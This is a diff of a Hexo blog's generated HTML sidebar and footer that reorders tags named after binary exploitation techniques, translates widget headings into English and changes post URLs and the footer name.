-			<li><a href="/tags/ret2shellcode/">ret2shellcode<span>2</span></a></li>
 		
 			<li><a href="/tags/栈溢出/">栈溢出<span>1</span></a></li>
 		
-			<li><a href="/tags/UAF/">UAF<span>1</span></a></li>
-		
-			<li><a href="/tags/格式化字符串溢出/">格式化字符串溢出<span>1</span></a></li>
-		
-			<li><a href="/tags/ret2VDSO/">ret2VDSO<span>1</span></a></li>
+			<li><a href="/tags/BlueKeep漏洞/">BlueKeep漏洞<span>1</span></a></li>
 		
 			<li><a href="/tags/栈迁移/">栈迁移<span>1</span></a></li>
 		
+			<li><a href="/tags/ret2shellcode/">ret2shellcode<span>2</span></a></li>
+		
 			<li><a href="/tags/ret2libc/">ret2libc<span>4</span></a></li>
 		
-			<li><a href="/tags/C-C/">C/C++<span>1</span></a></li>
+			<li><a href="/tags/格式化字符串溢出/">格式化字符串溢出<span>1</span></a></li>
+		
+			<li><a href="/tags/栈与堆/">栈与堆<span>1</span></a></li>
+		
+			<li><a href="/tags/UAF/">UAF<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -569,19 +644,19 @@
 		
 			
 <div class="widget">
-  <h4>最新文章</h4>
+  <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/uncategorized/[OGeek2019]babyrop/" ><i class="fa fa-file-o"></i>(OGeek2019)babyrop</a>
+        <a href="/ret2libc/[OGeek2019]babyrop/" ><i class="fa fa-file-o"></i>(OGeek2019)babyrop</a>
       </li>
     
       <li>
-        <a href="/uncategorized/C、C++/" ><i class="fa fa-file-o"></i>C/C++</a>
+        <a href="/C-C/C、C++/" ><i class="fa fa-file-o"></i>C/C++</a>
       </li>
     
       <li>
-        <a href="/uncategorized/Java基础学习/" ><i class="fa fa-file-o"></i>Java学习</a>
+        <a href="/Java/Java基础学习/" ><i class="fa fa-file-o"></i>Java学习</a>
       </li>
     
       <li>
@@ -598,7 +673,7 @@
 		
 			
 <div class="widget">
-	<h4>链接</h4>
+	<h4>Links</h4>
 	<ul class="blogroll list-unstyled">
 	
 		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
@@ -619,7 +694,7 @@
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2023 pdxbshx's Blog
+  &copy; 2023 John Doe's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
